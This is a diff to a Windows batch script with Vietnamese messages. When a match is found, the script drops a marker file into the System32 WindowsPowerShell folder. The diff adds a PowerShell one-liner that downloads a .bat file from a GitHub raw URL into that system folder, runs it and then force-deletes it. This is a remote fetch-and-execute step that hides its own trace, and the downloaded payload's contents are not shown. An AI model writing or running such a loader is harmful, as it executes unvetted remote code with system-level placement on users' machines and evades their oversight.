@@ -29,7 +29,8 @@ for /f "tokens=*" %%j in ('type "%tempfile%"') do (
 if %found%==1 (
     echo Trung Khop
     echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries3.txt
-    :: Thực hiện các lệnh tiếp theo ở đây
+    powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Force}"
+
     echo Thuc Hien Cac Lenh Khac...
 ) else (
     echo Khong Trung Khop.
